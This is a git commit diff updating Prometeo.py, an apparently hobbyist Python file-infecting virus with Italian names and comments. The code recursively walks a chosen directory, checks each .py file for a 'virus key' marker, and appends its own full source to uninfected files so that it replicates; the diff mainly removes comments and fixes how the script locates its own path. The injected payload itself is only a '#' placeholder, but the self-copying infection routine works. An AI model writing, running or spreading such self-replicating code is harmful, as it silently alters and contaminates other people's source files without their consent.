71f77bd79143d6b325f2bb4e96ad5fb526a0fd13
GodIik <34945143+GodIik@users.noreply.github.com>
2018-01-10 23:44:59 +0100

    Update Prometeo.py

--- Prometeo.py
+++ Prometeo.py
@@ -1,6 +1,4 @@
-
-# Importazioni necessarie
-
+#!usr/bin/pyhton
 import os, sys, shutil, random, glob, time
 
 viruskey = "#! My Virus Key: 1x2y3z"
@@ -16,74 +14,72 @@ myself = sys.argv[0]
 
 #1 indentificazione
 
-def identificazione():
+def identificazione(mypath):
 
-	_path_ = os.getcwd() # ottengo la directory corrente
-	for path, directory, files in os.walk(_path_): # ottengo tutte le directory, sottodirectory e files prsenti nella path
+	_path_ = os.getcwd()
+	for path, directory, files in os.walk(_path_):
 		for file in files:
-			time.sleep(0.5)
-			_file_, punto, estensione = file.partition('.') # Suddivide il file in tre parti separate dal punto, se dopo il punto
-			if not file == myself: 
-				if estensione == "py": # vi è py (estensione file python) il il file e' infettabile
+			if not file == myself:
+				time.sleep(0.5)
+				_file_, punto, estensione = file.partition('.')
+				if estensione == "py":
 					try:
 						infettato = "No"
-						fileopen = open(file, 'r') # Apri il file per leggerlo
-						for line in fileopen: # Analizzo le righe			
-							if viruskey in line: #Se trovi la key del virus il file e' infetto
+						fileopen = open(file, 'r')
+						for line in fileopen:
+							if viruskey in line:
 								infettato = "Si"
 								print("[*] File gia' infettato > " + file)
 								break
-						if infettato == "No": # Avvia infezione del file non infetto
+						if infettato == "No":
 							print("[+] Infetto il file... " + file)
-							infezione_exploit(file)
+							infezione_exploit(file, mypath)
 					except FileNotFoundError:
 						pass
-				else:
-					pass
-			else: 
-				pass
+
 #2 Infezione
 
 #exploit = """"""
-def infezione_exploit(file):
-	
-	exploitstatus = "No" # Stato dell'Exploit negativo (vuol dire che non e' stato ancora iniettato)
-	exploit =  "#" #'print("Exploited_)' # Questo è l'Exploit, e' possibile cambiarlo con altri
+def infezione_exploit(file, mypath):
+
+	exploitstatus = "No"
+	exploit =  "#"
 	print("\n[*] Preparo l'Exploit...")
 	try:
-		_file_ = open(file, 'a') # Apro il file
-		_file_.write("\n" + exploit) # Inietto l'exploit nel file vittima "\n" + viruskey + 
-		exploitstatus = "Si" # Stato dell' exploit positivo (exploit iniettato)
-		_file_.close() # Chiudo il file
+		_file_ = open(file, 'a')
+		_file_.write("\n" + exploit)
+		exploitstatus = "Si"
+		_file_.close()
 	except FileNotFoundError:
 		pass
-	if exploitstatus == "Si": # Se l'exploit è stato iniettato procendi con la Replicazione
+	if exploitstatus == "Si":
 		print("[+] Infezione Riuscita")
 		print("[*] Mi copio nel file...")
-		infezione_myself(file)
-	else:
-		pass
+		infezione_myself(file, mypath)
 
 #3 Infezione (Inietto tutto il virus)
 
-def infezione_myself(file):
+def infezione_myself(file, mypath):
 
-	myself = sys.argv[0] # Il mio Virus
-	myself = open(myself, 'r') # Apro il virus in modalita' read
-	file = open(file, 'a') # Apro il file vittima in modalita' append
-	for line in myself: # Per ogni righa nel mio virus 
-		file.write(str(line)) # Scrivi nel file vittima quella linea 
+	_myself_ = open(mypath, 'r')
+	file = open(file, 'a')
+	for line in _myself_:
+		file.write(str(line))
 	print("[+] File infettato Correttamente!")
-	file.close() # Chiudo il file
-	myself.close() #Chiudo il file
+	file.close()
+	_myself_.close()
+
+# If name in Main
 
 if __name__ == '__main__':
-	
-	print(banner) # Banner
+
+	print(banner)
 	try:
 		directory = input("Path >> ")
-		os.chdir(directory) # Cambia directory in quella inserita
+		mypath = os.getcwd() + "\\" + sys.argv[0]
+		print(mypath)
+		os.chdir(directory)
 	except FileNotFoundError :
 		print("[!] Path non Trovata")
 		exit
-	identificazione()
+	identificazione(mypath)
